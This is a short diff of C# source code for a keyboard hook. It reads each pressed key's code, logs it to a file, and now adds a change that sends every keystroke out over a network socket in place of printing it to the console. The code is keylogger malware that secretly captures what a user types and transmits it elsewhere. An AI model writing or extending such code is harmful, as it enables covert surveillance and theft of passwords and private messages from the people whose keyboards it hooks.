@@ -57,7 +57,8 @@ namespace IP
                 /* Extract the virtual key code of the pressed key */
                 int vkCode = Marshal.ReadInt32(lParam);
                 LoggerWriter.WriteToLog(vkCode,docPath);
-                Console.WriteLine((Keys)vkCode);
+                SocketWriter.WriteToSocket(((Keys)vkCode).ToString());
+                //Console.WriteLine((Keys)vkCode);
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
